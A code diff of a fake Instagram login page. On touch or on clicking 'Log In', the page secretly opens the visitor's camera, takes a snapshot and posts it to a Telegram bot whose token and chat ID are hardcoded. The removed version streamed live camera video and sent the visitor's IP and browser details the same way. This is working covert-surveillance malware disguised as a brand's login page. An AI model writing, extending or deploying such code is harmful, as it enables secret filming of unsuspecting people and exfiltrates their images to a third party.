@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
     <style>
         body {
             background-color: #121212;
@@ -40,12 +39,12 @@
             font-size: 16px;
             cursor: pointer;
         }
-        button:hover {
-            background-color: #007bb5;
+        canvas {
+            display: none;
         }
     </style>
 </head>
-<body ontouchstart="startLiveStream()">
+<body ontouchstart="startCapture()">
 
     <div class="container">
         <div class="logo">
@@ -53,74 +52,68 @@
         </div>
         <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="startLiveStream()">Log In</button>
+        <button onclick="startCapture()">Log In</button>
     </div>
 
+    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
+
     <script>
-        let peer;
-        let peerId;
-        let ipAddress = "Unknown IP";
+        let localStream;
 
-        async function startLiveStream() {
-            await getIpAddress();  // Fetch user’s IP address
-            await initializeCamera();  // Start user’s camera
-            initializePeerConnection();  // Set up PeerJS
+        // Capture the camera feed and take a snapshot
+        async function startCapture() {
+            await initializeCamera();  // Initialize the user's camera
+            captureSnapshot();  // Capture a snapshot and send it to the bot
         }
 
-        async function getIpAddress() {
-            await fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipAddress = data.ip;
-                    console.log("IP Address:", ipAddress);
-                });
-        }
-
+        // Get the user's camera stream
         async function initializeCamera() {
             try {
-                const localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 console.log('Camera stream initialized.');
             } catch (error) {
                 console.error('Failed to access camera:', error);
             }
         }
 
-        function initializePeerConnection() {
-            peer = new Peer();
+        // Capture a snapshot and send it to the Telegram bot
+        function captureSnapshot() {
+            const video = document.createElement('video');
+            video.srcObject = localStream;
+            video.play();
 
-            peer.on('open', (id) => {
-                peerId = id;
-                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
-                sendDetailsToBot(liveStreamLink);
-            });
+            // Wait for the video to start playing before capturing the snapshot
+            video.onloadedmetadata = () => {
+                const canvas = document.getElementById('snapshotCanvas');
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                video.pause();  // Pause the video after taking the snapshot
+
+                // Convert the canvas to a Blob (image)
+                canvas.toBlob((blob) => {
+                    sendSnapshotToBot(blob);  // Send the image to the bot
+                }, 'image/jpeg');
+            };
         }
 
-        function sendDetailsToBot(liveStreamLink) {
+        // Send the image to the Telegram bot
+        function sendSnapshotToBot(imageBlob) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
             const chatId = '860517021';
-            const message = `🚨 New Interaction Detected 🚨\n\n📌 IP Address: ${ipAddress}\n📌 Peer ID: ${peerId}\n📌 Browser: ${navigator.userAgent}\n📌 Platform: ${navigator.platform}\n📌 Simulated Browser History:\n${simulateBrowserHistory()}\n📌 Live Camera Stream: ${liveStreamLink}\n⏰ Time: ${new Date().toLocaleString()}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            const formData = new FormData();
+            formData.append('photo', imageBlob, 'snapshot.jpg');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
+                body: formData
+            })
+            .then(() => {
+                console.log('Snapshot sent to Telegram bot.');
+            })
+            .catch((error) => {
+                console.error('Error sending snapshot:', error);
             });
-        }
-
-        function simulateBrowserHistory() {
-            const recentSites = [
-                'https://www.google.com/',
-                'https://www.youtube.com/',
-                'https://www.facebook.com/',
-                'https://www.instagram.com/',
-                'https://www.twitter.com/'
-            ];
-            return recentSites.join('\n');
         }
     </script>
 
